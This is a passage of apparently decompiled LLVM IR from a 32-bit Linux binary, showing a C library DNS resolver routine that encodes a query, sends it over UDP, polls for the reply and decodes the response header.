  %v1_8052fdd = add i32 %v0_8052fc1, 4
  %v2_8052fdd = inttoptr i32 %v1_8052fdd to i32*
  store i32 ptrtoint (i32* @global_var_80585dc.245 to i32), i32* %v2_8052fdd, align 4
  %v1_8052fe2 = add i32 %v0_8052fc1, 28
  %v2_8052fe2 = inttoptr i32 %v1_8052fe2 to i32*
  %v3_8052fe2 = load i32, i32* %v2_8052fe2, align 4
  %v6_8052fe2 = inttoptr i32 %v0_8052fc1 to i32*
  store i32 %v3_8052fe2, i32* %v6_8052fe2, align 4
  %v0_8052fe6 = call i32 @__GI_strncat()
  store i32 %v0_8052fe6, i32* %eax.global-to-local, align 4
  %v0_8052feb = load i32, i32* @esp, align 4
  %v1_8052fee = add i32 %v0_8052feb, 8
  %v2_8052fee = inttoptr i32 %v1_8052fee to i32*
  store i32 1025, i32* %v2_8052fee, align 4
  %v1_8052ff3 = add i32 %v0_8052feb, 52
  %v2_8052ff3 = inttoptr i32 %v1_8052ff3 to i32*
  %v3_8052ff3 = load i32, i32* %v2_8052ff3, align 4
  store i32 %v3_8052ff3, i32* %edx.global-to-local, align 4
  %v1_8052ff7 = mul i32 %v3_8052ff3, 4
  %v2_8052ff7 = add i32 %v1_8052ff7, 134614392
  %v3_8052ff7 = inttoptr i32 %v2_8052ff7 to i32*
  %v4_8052ff7 = load i32, i32* %v3_8052ff7, align 4
  %v6_8052ff7 = add i32 %v0_8052feb, 4
  %v7_8052ff7 = inttoptr i32 %v6_8052ff7 to i32*
  store i32 %v4_8052ff7, i32* %v7_8052ff7, align 4
  %v1_8052ffe = add i32 %v0_8052feb, 28
  %v2_8052ffe = inttoptr i32 %v1_8052ffe to i32*
  %v3_8052ffe = load i32, i32* %v2_8052ffe, align 4
  %v6_8052ffe = inttoptr i32 %v0_8052feb to i32*
  store i32 %v3_8052ffe, i32* %v6_8052ffe, align 4
  %v0_8053002 = call i32 @__GI_strncat()
  store i32 %v0_8053002, i32* %eax.global-to-local, align 4
  %v0_8053007 = load i32, i32* @esp, align 4
  %v1_8053007 = add i32 %v0_8053007, 16
  br label %dec_label_pc_805300a

dec_label_pc_805300a:                             ; preds = %dec_label_pc_8052f73.dec_label_pc_805300a_crit_edge, %dec_label_pc_8052fcb, %dec_label_pc_8052fd7
  %v1_805300a = phi i32 [ %v1_8052fc1, %dec_label_pc_8052f73.dec_label_pc_805300a_crit_edge ], [ %v1_8052fc1, %dec_label_pc_8052fcb ], [ %v1_8053007, %dec_label_pc_8052fd7 ]
  %v0_805300a = phi i32 [ %v0_805300a.pre, %dec_label_pc_8052f73.dec_label_pc_805300a_crit_edge ], [ %v3_8052fc4, %dec_label_pc_8052fcb ], [ %v0_8053002, %dec_label_pc_8052fd7 ]
  %v2_805300a = add i32 %v1_805300a, -4
  %v3_805300a = inttoptr i32 %v2_805300a to i32*
  store i32 %v0_805300a, i32* %v3_805300a, align 4
  %v0_805300b = load i32, i32* %eax.global-to-local, align 4
  %v2_805300b = add i32 %v1_805300a, -8
  %v3_805300b = inttoptr i32 %v2_805300b to i32*
  store i32 %v0_805300b, i32* %v3_805300b, align 4
  %v1_805300c = add i32 %v1_805300a, -12
  %v2_805300c = inttoptr i32 %v1_805300c to i32*
  store i32 1, i32* %v2_805300c, align 4
  %v1_805300e = add i32 %v1_805300a, 184
  store i32 %v1_805300e, i32* @eax, align 4
  %v2_8053015 = add i32 %v1_805300a, -16
  %v3_8053015 = inttoptr i32 %v2_8053015 to i32*
  store i32 %v1_805300e, i32* %v3_8053015, align 4
  %v2_8053016 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052ec0)
  store i32 %v2_8053016, i32* %eax.global-to-local, align 4
  %v0_805301b = load i32, i32* @esp, align 4
  %v1_805301b = add i32 %v0_805301b, 28
  %v2_805301b = inttoptr i32 %v1_805301b to i32*
  %v3_805301b = load i32, i32* %v2_805301b, align 4
  store i32 %v3_805301b, i32* %eax.global-to-local, align 4
  %v1_805301f = add i32 %v0_805301b, 260
  %v2_805301f = inttoptr i32 %v1_805301f to i32*
  %v3_805301f = load i32, i32* %v2_805301f, align 4
  store i32 %v3_805301f, i32* @edx, align 4
  %v1_8053026 = add i32 %v0_805301b, 224
  %v2_8053026 = inttoptr i32 %v1_8053026 to i32*
  store i32 1, i32* %v2_8053026, align 4
  %v0_8053031 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053031 = load i32, i32* @esp, align 4
  %v2_8053031 = add i32 %v1_8053031, 216
  %v3_8053031 = inttoptr i32 %v2_8053031 to i32*
  store i32 %v0_8053031, i32* %v3_8053031, align 4
  %v1_805303d = load i32, i32* @ebx, align 4
  %v2_805303d = sub i32 512, %v1_805303d
  store i32 %v2_805303d, i32* %eax.global-to-local, align 4
  %v0_805303f = load i32, i32* @edx, align 4
  %v1_805303f = load i32, i32* @esp, align 4
  %v2_805303f = add i32 %v1_805303f, 220
  %v3_805303f = inttoptr i32 %v2_805303f to i32*
  store i32 %v0_805303f, i32* %v3_805303f, align 4
  %v0_8053046 = load i32, i32* @esp, align 4
  %v0_8053049 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053049 = add i32 %v0_8053046, 8
  %v3_8053049 = inttoptr i32 %v2_8053049 to i32*
  store i32 %v0_8053049, i32* %v3_8053049, align 4
  %v1_805304a = load i32, i32* @ebx, align 4
  %v2_805304a = add i32 %v1_805304a, %v2_8052e32
  %v2_805304e = add i32 %v0_8053046, 4
  %v3_805304e = inttoptr i32 %v2_805304e to i32*
  store i32 %v2_805304a, i32* %v3_805304e, align 4
  %v1_805304f = add i32 %v0_8053046, 216
  store i32 %v1_805304f, i32* @eax, align 4
  %v3_8053056 = inttoptr i32 %v0_8053046 to i32*
  store i32 %v1_805304f, i32* %v3_8053056, align 4
  %v0_8053057 = call i32 @__encode_question()
  store i32 %v0_8053057, i32* %eax.global-to-local, align 4
  %v0_805305c = load i32, i32* @esp, align 4
  %v2_805305f = icmp slt i32 %v0_8053057, 0
  store i32 %v0_8053057, i32* @esi, align 4
  br i1 %v2_805305f, label %dec_label_pc_80534c5, label %dec_label_pc_8053069

dec_label_pc_8053069:                             ; preds = %dec_label_pc_805300a
  %v1_8053069 = add i32 %v0_805305c, 172
  %v2_8053069 = inttoptr i32 %v1_8053069 to i16*
  store i16 2, i16* %v2_8053069, align 2
  %v1_8053073 = load i32, i32* @esp, align 4
  %v2_8053073 = add i32 %v1_8053073, -4
  %v3_8053073 = inttoptr i32 %v2_8053073 to i32*
  store i32 %v0_8053057, i32* %v3_8053073, align 4
  %v1_8053074 = add i32 %v1_8053073, 164
  store i32 %v1_8053074, i32* %eax.global-to-local, align 4
  %v2_805307b = add i32 %v1_8053073, -8
  %v3_805307b = inttoptr i32 %v2_805307b to i32*
  store i32 %v1_8053074, i32* %v3_805307b, align 4
  %v1_805307c = add i32 %v1_8053073, 32
  %v2_805307c = inttoptr i32 %v1_805307c to i32*
  %v3_805307c = load i32, i32* %v2_805307c, align 4
  %v5_805307c = add i32 %v1_8053073, -12
  %v6_805307c = inttoptr i32 %v5_805307c to i32*
  store i32 %v3_805307c, i32* %v6_805307c, align 4
  %v1_8053080 = add i32 %v1_8053073, -16
  %v2_8053080 = inttoptr i32 %v1_8053080 to i32*
  store i32 10, i32* %v2_8053080, align 4
  %v5_8053082 = call i32 @inet_pton(i32 -1, i8* %v4_8053082, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8053082, i32* %eax.global-to-local, align 4
  %v0_8053087 = load i32, i32* @esp, align 4
  %v1_8053087 = add i32 %v0_8053087, 16
  %tmp47 = icmp slt i32 %v5_8053082, 1
  br i1 %tmp47, label %dec_label_pc_8053098, label %dec_label_pc_805308e

dec_label_pc_805308e:                             ; preds = %dec_label_pc_8053069
  %v1_805308e = add i32 %v0_8053087, 172
  %v2_805308e = inttoptr i32 %v1_805308e to i16*
  store i16 10, i16* %v2_805308e, align 2
  %v0_8053098.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053098

dec_label_pc_8053098:                             ; preds = %dec_label_pc_8053069, %dec_label_pc_805308e
  %v0_80530af = phi i32 [ %v1_8053087, %dec_label_pc_8053069 ], [ %v0_8053098.pre, %dec_label_pc_805308e ]
  %v1_8053098 = add i32 %v0_80530af, 156
  %v2_8053098 = inttoptr i32 %v1_8053098 to i16*
  %v3_8053098 = load i16, i16* %v2_8053098, align 2
  %v12_8053098 = icmp eq i16 %v3_8053098, 10
  %v1_80530a1 = icmp eq i1 %v12_8053098, false
  %v1_80530af = add i32 %v0_80530af, 158
  %v2_80530af = inttoptr i32 %v1_80530af to i16*
  store i16 13568, i16* %v2_80530af, align 2
  %v0_80530b9 = load i32, i32* @esp, align 4
  br i1 %v1_80530a1, label %dec_label_pc_80530af, label %dec_label_pc_80530cf

dec_label_pc_80530af:                             ; preds = %dec_label_pc_8053098
  %v1_80530bc = add i32 %v0_80530b9, 32
  %v2_80530bc = inttoptr i32 %v1_80530bc to i32*
  %v3_80530bc = load i32, i32* %v2_80530bc, align 4
  %v5_80530bc = add i32 %v0_80530b9, -16
  %v6_80530bc = inttoptr i32 %v5_80530bc to i32*
  store i32 %v3_80530bc, i32* %v6_80530bc, align 4
  %v1_80530c0 = call i32 @inet_addr(i32 -1)
  store i32 %v1_80530c0, i32* %eax.global-to-local, align 4
  %v1_80530c5 = load i32, i32* @esp, align 4
  %v2_80530c5 = add i32 %v1_80530c5, 176
  %v3_80530c5 = inttoptr i32 %v2_80530c5 to i32*
  store i32 %v1_80530c0, i32* %v3_80530c5, align 4
  %v0_80530cc = load i32, i32* @esp, align 4
  %v1_80530cc = add i32 %v0_80530cc, 16
  br label %dec_label_pc_80530cf

dec_label_pc_80530cf:                             ; preds = %dec_label_pc_8053098, %dec_label_pc_80530af
  %v1_80530cf = phi i32 [ %v1_80530cc, %dec_label_pc_80530af ], [ %v0_80530b9, %dec_label_pc_8053098 ]
  %v0_80530cf = load i32, i32* @ecx, align 4
  %v2_80530cf = add i32 %v1_80530cf, -4
  %v3_80530cf = inttoptr i32 %v2_80530cf to i32*
  store i32 %v0_80530cf, i32* %v3_80530cf, align 4
  %v1_80530d0 = add i32 %v1_80530cf, -8
  %v2_80530d0 = inttoptr i32 %v1_80530d0 to i32*
  store i32 17, i32* %v2_80530d0, align 4
  %v1_80530d2 = add i32 %v1_80530cf, -12
  %v2_80530d2 = inttoptr i32 %v1_80530d2 to i32*
  store i32 2, i32* %v2_80530d2, align 4
  %v1_80530d4 = add i32 %v1_80530cf, 156
  %v2_80530d4 = inttoptr i32 %v1_80530d4 to i16*
  %v3_80530d4 = load i16, i16* %v2_80530d4, align 2
  %v4_80530d4 = zext i16 %v3_80530d4 to i32
  store i32 %v4_80530d4, i32* %eax.global-to-local, align 4
  %v2_80530dc = add i32 %v1_80530cf, -16
  %v3_80530dc = inttoptr i32 %v2_80530dc to i32*
  store i32 %v4_80530d4, i32* %v3_80530dc, align 4
  %v3_80530dd = call i32 @socket(i32 -1, i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80530dd, i32* %eax.global-to-local, align 4
  %v1_80530e2 = load i32, i32* @esp, align 4
  %v2_80530e2 = add i32 %v1_80530e2, 36
  %v3_80530e2 = inttoptr i32 %v2_80530e2 to i32*
  store i32 %v3_80530dd, i32* %v3_80530e2, align 4
  %v0_80530e6 = load i32, i32* @esp, align 4
  %v1_80530e6 = add i32 %v0_80530e6, 16
  %v0_80530e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80530e9 = icmp slt i32 %v0_80530e9, 0
  br i1 %v2_80530e9, label %dec_label_pc_8053116, label %dec_label_pc_80530ed

dec_label_pc_80530ed:                             ; preds = %dec_label_pc_80530cf
  %v1_80530ed = add i32 %v0_80530e6, 172
  store i32 %v1_80530ed, i32* %eax.global-to-local, align 4
  %v0_80530f4 = load i32, i32* @edx, align 4
  %v2_80530f4 = add i32 %v0_80530e6, 12
  %v3_80530f4 = inttoptr i32 %v2_80530f4 to i32*
  store i32 %v0_80530f4, i32* %v3_80530f4, align 4
  %v1_80530f5 = add i32 %v0_80530e6, 8
  %v2_80530f5 = inttoptr i32 %v1_80530f5 to i32*
  store i32 28, i32* %v2_80530f5, align 4
  %v0_80530f7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80530f7 = add i32 %v0_80530e6, 4
  %v3_80530f7 = inttoptr i32 %v2_80530f7 to i32*
  store i32 %v0_80530f7, i32* %v3_80530f7, align 4
  %v1_80530f8 = add i32 %v0_80530e6, 36
  %v2_80530f8 = inttoptr i32 %v1_80530f8 to i32*
  %v3_80530f8 = load i32, i32* %v2_80530f8, align 4
  %v6_80530f8 = inttoptr i32 %v0_80530e6 to i32*
  store i32 %v3_80530f8, i32* %v6_80530f8, align 4
  %v3_80530fc = call i32 @__libc_connect(i32 -1, i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80530fc, i32* %eax.global-to-local, align 4
  %v0_8053101 = load i32, i32* @esp, align 4
  %v2_8053104 = icmp slt i32 %v3_80530fc, 0
  %v1_8053106 = icmp eq i1 %v2_8053104, false
  br i1 %v1_8053106, label %dec_label_pc_805311f, label %dec_label_pc_8053108

dec_label_pc_8053108:                             ; preds = %dec_label_pc_80530ed
  %v1_8053108 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8053108, i32* %eax.global-to-local, align 4
  %v1_805310d = inttoptr i32 %v1_8053108 to i32*
  %v2_805310d = load i32, i32* %v1_805310d, align 4
  %v11_805310d = icmp eq i32 %v2_805310d, 101
  %v0_805347f.pre = load i32, i32* @esp, align 4
  br i1 %v11_805310d, label %dec_label_pc_805347f, label %dec_label_pc_8053116

dec_label_pc_8053116:                             ; preds = %dec_label_pc_8053108, %dec_label_pc_80530cf
  %v17_8053116 = phi i32 [ %v1_80530e6, %dec_label_pc_80530cf ], [ %v0_805347f.pre, %dec_label_pc_8053108 ]
  %v1_8053116 = add i32 %v17_8053116, 28
  %v2_8053116 = inttoptr i32 %v1_8053116 to i32*
  %v3_8053116 = load i32, i32* %v2_8053116, align 4
  %v4_8053116 = add i32 %v3_8053116, 1
  store i32 %v4_8053116, i32* %v2_8053116, align 4
  br label %dec_label_pc_80534a0.backedge

dec_label_pc_805311f:                             ; preds = %dec_label_pc_80530ed
  %v1_805311f = add i32 %v0_8053101, 12
  %v2_805311f = inttoptr i32 %v1_805311f to i32*
  store i32 0, i32* %v2_805311f, align 4
  %v0_8053121 = load i32, i32* @ebx, align 4
  %v1_8053121 = load i32, i32* @esi, align 4
  %v2_8053121 = add i32 %v1_8053121, %v0_8053121
  store i32 %v2_8053121, i32* %eax.global-to-local, align 4
  %v2_8053124 = add i32 %v0_8053101, 8
  %v3_8053124 = inttoptr i32 %v2_8053124 to i32*
  store i32 %v2_8053121, i32* %v3_8053124, align 4
  %v2_8053125 = add i32 %v0_8053101, 4
  %v3_8053125 = inttoptr i32 %v2_8053125 to i32*
  store i32 %v2_8052e32, i32* %v3_8053125, align 4
  %v1_8053126 = add i32 %v0_8053101, 36
  %v2_8053126 = inttoptr i32 %v1_8053126 to i32*
  %v3_8053126 = load i32, i32* %v2_8053126, align 4
  %v6_8053126 = inttoptr i32 %v0_8053101 to i32*
  store i32 %v3_8053126, i32* %v6_8053126, align 4
  %v4_805312a = call i32 @__libc_send(i32 -1, i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805312a, i32* %eax.global-to-local, align 4
  %v0_805312f = load i32, i32* @esp, align 4
  %v1_805312f = add i32 %v0_805312f, 36
  %v2_805312f = inttoptr i32 %v1_805312f to i32*
  %v3_805312f = load i32, i32* %v2_805312f, align 4
  store i32 %v3_805312f, i32* %eax.global-to-local, align 4
  %v1_8053133 = add i32 %v0_805312f, 232
  %v2_8053133 = inttoptr i32 %v1_8053133 to i16*
  store i16 1, i16* %v2_8053133, align 2
  %v0_805313d = load i32, i32* %eax.global-to-local, align 4
  %v1_805313d = load i32, i32* @esp, align 4
  %v2_805313d = add i32 %v1_805313d, 228
  %v3_805313d = inttoptr i32 %v2_805313d to i32*
  store i32 %v0_805313d, i32* %v3_805313d, align 4
  %v0_8053144 = load i32, i32* @esp, align 4
  %v1_8053147 = add i32 %v0_8053144, 8
  %v2_8053147 = inttoptr i32 %v1_8053147 to i32*
  store i32 10000, i32* %v2_8053147, align 4
  %v1_805314c = add i32 %v0_8053144, 4
  %v2_805314c = inttoptr i32 %v1_805314c to i32*
  store i32 1, i32* %v2_805314c, align 4
  %v1_805314e = add i32 %v0_8053144, 228
  store i32 %v1_805314e, i32* %eax.global-to-local, align 4
  %v3_8053155 = inttoptr i32 %v0_8053144 to i32*
  store i32 %v1_805314e, i32* %v3_8053155, align 4
  %v0_8053156 = call i32 @__libc_poll()
  store i32 %v0_8053156, i32* %eax.global-to-local, align 4
  %v0_805315b = load i32, i32* @esp, align 4
  %v1_805315b = add i32 %v0_805315b, 16
  %tmp48 = icmp slt i32 %v0_8053156, 1
  br i1 %tmp48, label %dec_label_pc_805347f, label %dec_label_pc_8053166

dec_label_pc_8053166:                             ; preds = %dec_label_pc_805311f
  %v1_8053166 = add i32 %v0_805315b, 12
  %v2_8053166 = inttoptr i32 %v1_8053166 to i32*
  store i32 0, i32* %v2_8053166, align 4
  %v1_8053168 = add i32 %v0_805315b, 8
  %v2_8053168 = inttoptr i32 %v1_8053168 to i32*
  store i32 512, i32* %v2_8053168, align 4
  %v2_805316d = add i32 %v0_805315b, 4
  %v3_805316d = inttoptr i32 %v2_805316d to i32*
  store i32 %v2_8052e32, i32* %v3_805316d, align 4
  %v1_805316e = add i32 %v0_805315b, 36
  %v2_805316e = inttoptr i32 %v1_805316e to i32*
  %v3_805316e = load i32, i32* %v2_805316e, align 4
  %v6_805316e = inttoptr i32 %v0_805315b to i32*
  store i32 %v3_805316e, i32* %v6_805316e, align 4
  %v4_8053172 = call i32 @__libc_recv(i32 -1, i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8053172, i32* @eax, align 4
  %v1_8053177 = load i32, i32* @esp, align 4
  %v2_8053177 = add i32 %v1_8053177, 32
  %v3_8053177 = inttoptr i32 %v2_8053177 to i32*
  store i32 %v4_8053172, i32* %v3_8053177, align 4
  %v0_805317b = load i32, i32* @esp, align 4
  %v1_805317b = add i32 %v0_805317b, 16
  %v7_8053181 = icmp sgt i32 %v4_8053172, 11
  br i1 %v7_8053181, label %dec_label_pc_8053187, label %dec_label_pc_8053434

dec_label_pc_8053187:                             ; preds = %dec_label_pc_8053166
  %v0_8053187 = load i32, i32* @ebx, align 4
  %v2_8053187 = add i32 %v0_805317b, 12
  %v3_8053187 = inttoptr i32 %v2_8053187 to i32*
  store i32 %v0_8053187, i32* %v3_8053187, align 4
  %v0_8053188 = load i32, i32* @ebx, align 4
  %v2_8053188 = add i32 %v0_805317b, 8
  %v3_8053188 = inttoptr i32 %v2_8053188 to i32*
  store i32 %v0_8053188, i32* %v3_8053188, align 4
  %v1_8053189 = add i32 %v0_805317b, 84
  store i32 %v1_8053189, i32* %eax.global-to-local, align 4
  %v2_805318d = add i32 %v0_805317b, 4
  %v3_805318d = inttoptr i32 %v2_805318d to i32*
  store i32 %v1_8053189, i32* %v3_805318d, align 4
  %v3_805318e = inttoptr i32 %v0_805317b to i32*
  store i32 %v2_8052e32, i32* %v3_805318e, align 4
  %v0_805318f = call i32 @__decode_header()
  store i32 %v0_805318f, i32* %eax.global-to-local, align 4
  %v0_8053194 = load i32, i32* @esp, align 4
  %v1_8053194 = add i32 %v0_8053194, 84
  %v2_8053194 = inttoptr i32 %v1_8053194 to i32*
  %v3_8053194 = load i32, i32* %v2_8053194, align 4
  store i32 %v3_8053194, i32* %edx.global-to-local, align 4
  %v2_8053198 = add i32 %v0_8053194, 60
  %v3_8053198 = inttoptr i32 %v2_8053198 to i32*
  store i32 %v3_8053194, i32* %v3_8053198, align 4
  %v0_805319c = load i32, i32* @esp, align 4
  %v1_805319c = add i32 %v0_805319c, 16
  %v1_805319f = add i32 %v0_805319c, 72
  %v2_805319f = inttoptr i32 %v1_805319f to i32*
  %v3_805319f = load i32, i32* %v2_805319f, align 4
  store i32 %v3_805319f, i32* @eax, align 4
  %v0_80531a3 = load i32, i32* %edx.global-to-local, align 4
  %v12_80531a3 = icmp eq i32 %v0_80531a3, %v3_805319f
  %v1_80531a5 = icmp eq i1 %v12_80531a3, false
  br i1 %v1_80531a5, label %dec_label_pc_8053434, label %dec_label_pc_80531ab

dec_label_pc_80531ab:                             ; preds = %dec_label_pc_8053187
  %v1_80531ab = add i32 %v0_805319c, 88
  %v2_80531ab = inttoptr i32 %v1_80531ab to i32*
  %v3_80531ab = load i32, i32* %v2_80531ab, align 4
  %v4_80531ab = icmp eq i32 %v3_80531ab, 0
  br i1 %v4_80531ab, label %dec_label_pc_8053434, label %dec_label_pc_80531b6

dec_label_pc_80531b6:                             ; preds = %dec_label_pc_80531ab
  %v1_80531b6 = add i32 %v0_805319c, 112
  %v2_80531b6 = inttoptr i32 %v1_80531b6 to i32*
  %v3_80531b6 = load i32, i32* %v2_80531b6, align 4
  store i32 %v3_80531b6, i32* @eax, align 4
  %v9_80531ba = icmp eq i32 %v3_80531b6, 3
  %v1_80531bd = icmp eq i1 %v9_80531ba, false
  br i1 %v1_80531bd, label %dec_label_pc_8053225, label %dec_label_pc_80531bf

dec_label_pc_80531bf:                             ; preds = %dec_label_pc_80531b6
  %v1_80531bf = add i32 %v0_805319c, 67
  %v2_80531bf = inttoptr i32 %v1_80531bf to i8*
  %v3_80531bf = load i8, i8* %v2_80531bf, align 1
  %v4_80531bf = icmp eq i8 %v3_80531bf, 0
  %v1_80531c4 = icmp eq i1 %v4_80531bf, false
  br i1 %v1_80531c4, label %dec_label_pc_8053215, label %dec_label_pc_80531c6

dec_label_pc_80531c6:                             ; preds = %dec_label_pc_80531bf
  %v0_80531c6 = load i32, i32* @ecx, align 4
  %v2_80531c6 = add i32 %v0_805319c, 12
  %v3_80531c6 = inttoptr i32 %v2_80531c6 to i32*
  store i32 %v0_80531c6, i32* %v3_80531c6, align 4
  %v1_80531c7 = add i32 %v0_805319c, 8
  %v2_80531c7 = inttoptr i32 %v1_80531c7 to i32*
  store i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), i32* %v2_80531c7, align 4
  %v1_80531cc = add i32 %v0_805319c, 4
  %v2_80531cc = inttoptr i32 %v1_80531cc to i32*
  store i32 134552291, i32* %v2_80531cc, align 4
  %v1_80531d1 = add i32 %v0_805319c, 200
  store i32 %v1_80531d1, i32* @esi, align 4
  %v3_80531d8 = inttoptr i32 %v0_805319c to i32*
  store i32 %v1_80531d1, i32* %v3_80531d8, align 4
  %v2_80531d9 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052ec0)
  store i32 %v2_80531d9, i32* %eax.global-to-local, align 4
  %v0_80531de = load i32, i32* @esp, align 4
  %v1_80531de = inttoptr i32 %v0_80531de to i32*
  store i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), i32* %v1_80531de, align 4
  %v1_80531e5 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80531e5, i32* %eax.global-to-local, align 4
  %v0_80531ea = load i32, i32* @global_var_8060d98.244, align 8
  store i32 %v0_80531ea, i32* %ebx.global-to-local, align 4
  %v0_80531f0 = load i32, i32* @esp, align 4
  %v1_80531f0 = inttoptr i32 %v0_80531f0 to i32*
  %v2_80531f0 = load i32, i32* %v1_80531f0, align 4
  store i32 %v2_80531f0, i32* @eax, align 4
  %v3_80531f0 = add i32 %v0_80531f0, 4
  %v1_80531f1 = inttoptr i32 %v3_80531f0 to i32*
  %v2_80531f1 = load i32, i32* %v1_80531f1, align 4
  store i32 %v2_80531f1, i32* %edx.global-to-local, align 4
  %v1_80531f2 = add i32 %v0_80531ea, -1
  store i32 %v1_80531f2, i32* @ebx, align 4
  store i32 1, i32* %v1_80531f1, align 4
  %v0_80531f5 = load i32, i32* @esi, align 4
  store i32 %v0_80531f5, i32* %v1_80531f0, align 4
  %v2_80531f6 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052ec0)
  store i32 %v2_80531f6, i32* %eax.global-to-local, align 4
  %v0_80531fb = load i32, i32* @esp, align 4
  %v1_80531fe = add i32 %v0_80531fb, 52
  %v2_80531fe = inttoptr i32 %v1_80531fe to i32*
  %v3_80531fe = load i32, i32* %v2_80531fe, align 4
  %v4_80531fe = load i32, i32* @ebx, align 4
  %v5_80531fe = sub i32 %v3_80531fe, %v4_80531fe
  %v11_80531fe = xor i32 %v4_80531fe, %v3_80531fe
  %v12_80531fe = xor i32 %v5_80531fe, %v3_80531fe
  %v13_80531fe = and i32 %v12_80531fe, %v11_80531fe
  %v14_80531fe = icmp slt i32 %v13_80531fe, 0
  %v16_80531fe = icmp slt i32 %v5_80531fe, 0
  %v2_8053202 = icmp eq i1 %v16_80531fe, %v14_80531fe
  br i1 %v2_8053202, label %dec_label_pc_8053215, label %dec_label_pc_8053204

dec_label_pc_8053204:                             ; preds = %dec_label_pc_80531c6
  %v1_8053204 = add i32 %v0_80531fb, 60
  %v2_8053204 = inttoptr i32 %v1_8053204 to i32*
  %v3_8053204 = load i32, i32* %v2_8053204, align 4
  store i32 %v3_8053204, i32* %edx.global-to-local, align 4
  %v3_8053208 = load i32, i32* %v2_80531fe, align 4
  %v4_8053208 = add i32 %v3_8053208, 1
  store i32 %v4_8053208, i32* %v2_80531fe, align 4
  %v0_805320c = load i32, i32* %edx.global-to-local, align 4
  %v1_805320c = load i32, i32* @esp, align 4
  %v2_805320c = add i32 %v1_805320c, 56
  %v3_805320c = inttoptr i32 %v2_805320c to i32*
  store i32 %v0_805320c, i32* %v3_805320c, align 4
  br label %dec_label_pc_80534a0.backedge

dec_label_pc_8053215:                             ; preds = %dec_label_pc_80531c6, %dec_label_pc_80531bf
  %v0_8053215 = call i32 @__GI___h_errno_location()
  store i32 %v0_8053215, i32* %eax.global-to-local, align 4
  %v1_805321a = inttoptr i32 %v0_8053215 to i32*
  store i32 1, i32* %v1_805321a, align 4
  br label %dec_label_pc_80534d8

dec_label_pc_8053225:                             ; preds = %dec_label_pc_80531b6
  %v1_8053225 = icmp eq i32 %v3_80531b6, 0
  %v1_8053227 = icmp eq i1 %v1_8053225, false
  br i1 %v1_8053227, label %dec_label_pc_8053434, label %dec_label_pc_805322d

dec_label_pc_805322d:                             ; preds = %dec_label_pc_8053225
  %v1_805322d = add i32 %v0_805319c, 120
  %v2_805322d = inttoptr i32 %v1_805322d to i32*
  %v3_805322d = load i32, i32* %v2_805322d, align 4
  %tmp49 = icmp slt i32 %v3_805322d, 1
  br i1 %tmp49, label %dec_label_pc_805323d, label %dec_label_pc_8053234

dec_label_pc_8053234:                             ; preds = %dec_label_pc_805322d
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805325c

dec_label_pc_805323d:                             ; preds = %dec_label_pc_805322d
  %v0_805323d = call i32 @__GI___h_errno_location()
  store i32 %v0_805323d, i32* %eax.global-to-local, align 4
  %v1_8053242 = inttoptr i32 %v0_805323d to i32*
  store i32 4, i32* %v1_8053242, align 4
  br label %dec_label_pc_80534d8

dec_label_pc_805324d:                             ; preds = %dec_label_pc_805325c
  %v2_805324d = add i32 %v0_8053264, -4
  %v3_805324d = inttoptr i32 %v2_805324d to i32*
  store i32 %v0_805324d, i32* %v3_805324d, align 4
  %v0_805324e = load i32, i32* @ebx, align 4
  %v1_805324e = add i32 %v0_805324e, 1
  store i32 %v1_805324e, i32* @ebx, align 4
  %v0_805324f = load i32, i32* @eax, align 4
  %v2_805324f = add i32 %v0_8053264, -8
  %v3_805324f = inttoptr i32 %v2_805324f to i32*
  store i32 %v0_805324f, i32* %v3_805324f, align 4
  %v0_8053250 = load i32, i32* @esi, align 4
  %v2_8053250 = add i32 %v0_8053264, -12
  %v3_8053250 = inttoptr i32 %v2_8053250 to i32*
  store i32 %v0_8053250, i32* %v3_8053250, align 4
  %v2_8053251 = add i32 %v0_8053264, -16
  %v3_8053251 = inttoptr i32 %v2_8053251 to i32*
  store i32 %v2_8052e32, i32* %v3_8053251, align 4
  %v0_8053252 = call i32 @__length_question()
  store i32 %v0_8053252, i32* @eax, align 4
  %v0_8053257 = load i32, i32* @esp, align 4
  %v1_8053257 = add i32 %v0_8053257, 16
  %v0_805325a = load i32, i32* @esi, align 4
  %v2_805325a = add i32 %v0_805325a, %v0_8053252
  %v0_805325c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805325c

dec_label_pc_805325c:                             ; preds = %dec_label_pc_8053234, %dec_label_pc_805324d
  %v0_805324d = phi i32 [ %v3_80531b6, %dec_label_pc_8053234 ], [ %v0_8053252, %dec_label_pc_805324d ]
  %v0_8053264 = phi i32 [ %v1_805319c, %dec_label_pc_8053234 ], [ %v1_8053257, %dec_label_pc_805324d ]
  %v0_805325c = phi i32 [ 0, %dec_label_pc_8053234 ], [ %v0_805325c.pre, %dec_label_pc_805324d ]
  %storemerge = phi i32 [ 12, %dec_label_pc_8053234 ], [ %v2_805325a, %dec_label_pc_805324d ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_805325c = add i32 %v0_8053264, 100
  %v3_805325c = inttoptr i32 %v2_805325c to i32*
  %v4_805325c = load i32, i32* %v3_805325c, align 4
  %v5_805325c = sub i32 %v0_805325c, %v4_805325c
  %v11_805325c = xor i32 %v4_805325c, %v0_805325c
  %v12_805325c = xor i32 %v5_805325c, %v0_805325c
  %v13_805325c = and i32 %v12_805325c, %v11_805325c
  %v14_805325c = icmp slt i32 %v13_805325c, 0
